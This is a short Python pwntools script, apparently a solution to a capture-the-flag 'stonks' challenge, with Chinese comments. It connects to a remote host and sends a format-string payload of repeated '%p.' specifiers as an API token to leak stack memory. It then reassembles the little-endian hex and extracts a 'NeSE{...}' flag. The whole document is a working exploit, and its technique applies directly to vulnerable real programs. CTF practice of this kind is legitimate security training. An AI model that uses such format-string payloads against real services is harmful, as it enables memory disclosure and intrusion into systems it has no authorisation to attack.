from pwn import *
import re

def exploit():
    r = remote('124.16.75.117', 51003)
    # 选择选项1 - Buy some stonks
    r.sendlineafter(b"What would you like to do?", b"1")
    # 构造格式化字符串payload来泄露更多栈内容
    r.sendlineafter(b"What is your API token?", b'%p.' * 16)
    r.recvuntil(b"Buying stonks with token:\n")
    leak = r.recvuntil(b"\nPortfolio as of", drop=True)

    # 处理泄露的数据
    leaks = leak.split(b'.')
    flag_parts = []

    # 尝试从泄露的数据中提取flag
    for item in leaks:
        hex_str = item.decode().strip() # 转换为字节
        if not hex_str.startswith('0x'):
            continue
        hex_bytes = hex_str[2:] # 去掉0x前缀
        if len(hex_bytes) % 2 != 0: # 确保长度是偶数
            hex_bytes = '0' + hex_bytes
        bytes_data = bytes.fromhex(hex_bytes)[::-1] # 小端序
        flag_parts.append(bytes_data) # 检查是否包含flag部分
    full_flag = b''.join(flag_parts) # 组合所有可能的flag部分

    # 使用正则表达式提取完整flag
    flag_match = re.search(b'NeSE\{[^}]+\}', full_flag)
    if flag_match:
        print("Flag found:", flag_match.group(0).decode())
    else:
        print("Partial flag found:", full_flag.decode(errors='ignore'))
    r.close()

if __name__ == "__main__":
    exploit()
    